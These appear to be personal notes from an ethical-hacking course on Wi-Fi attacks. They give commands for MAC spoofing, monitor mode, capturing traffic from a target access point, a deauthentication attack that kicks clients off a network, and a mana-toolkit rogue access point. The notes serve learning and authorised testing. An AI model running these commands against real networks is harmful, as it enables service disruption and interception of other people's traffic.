# network penetration

https://www.udemy.com/learn-ethical-hacking-from-scratch/learn/v4/t/lecture/5305122?start=0

## monitor mode method 1

```sh
# stop interface
ifconfig wlan0 down
# start interface
ifconfig wlan0 up
# change mac address of interface
macchanger --random wlan0
# start monitor mode on interface
airmon-ng start wlan0
# list interfaces (reports monitor mode)
iwconfig # interface optional
```

interface has monitor mode or managed mode

- managed mode filters on packets with appropriate mac address
- monitor mode will catch all packets

if airmon-ng does not work, you can enable monitor mode by trying

# method 2

```sh
iwconfig wlan0 down
iwconfig wlan0 mode monitor
iwconfig wlan0 up
iwconfig
```

# method 3
```sh
airmon-ng check kill # shut down processes that may interfere
iwconfig wlan 0 down
airmon-ng start wlan0
```

# packet sniffing

```sh
airodump-ng wlan0mon
airodump-ng --channel 11 --bssid <macaddroftargetap> --write test-tempestad wlan0mon
```


# deauth attack
```sh
aireplay-ng --deauth 1000 -a <bssid> -c <client_mac_addr> wlan0mon
```

## honeypot

```sh
apt-get install mana-toolkit
# ensure config below has correct interfaces listed, update SSID if needed
/etc/mana-toolkit/hostapd-mana.conf
# ensure script below has correct interface in phy var
/usr/share/mana-toolkit/run-man/start-nat-simple.sh
# run cmd
bash /usr/share/mana-toolkit/run-man/start-nat-simple.sh
# from here you can connect to fake access point on another machine
```
